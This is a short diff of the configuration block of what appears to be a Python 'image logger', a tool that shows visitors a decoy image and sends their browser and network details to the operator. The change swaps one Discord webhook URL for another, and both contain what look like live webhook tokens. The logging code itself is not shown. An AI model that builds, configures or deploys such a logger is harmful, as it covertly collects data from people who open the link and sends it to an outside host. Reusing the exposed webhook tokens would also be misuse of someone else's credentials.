@@ -5,7 +5,7 @@ import traceback, requests, base64, httpagentparser
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1348718741852262450/6GhZs-zkd4dUdTc1evbzKtrYXCCAq5kerxnbwzcaOfNL9Dae2Q7z9kUyrCvwcFs3T4dn",
+    "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
     "image": "https://i.ytimg.com/vi/ZwmUhZiUksA/maxresdefault.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
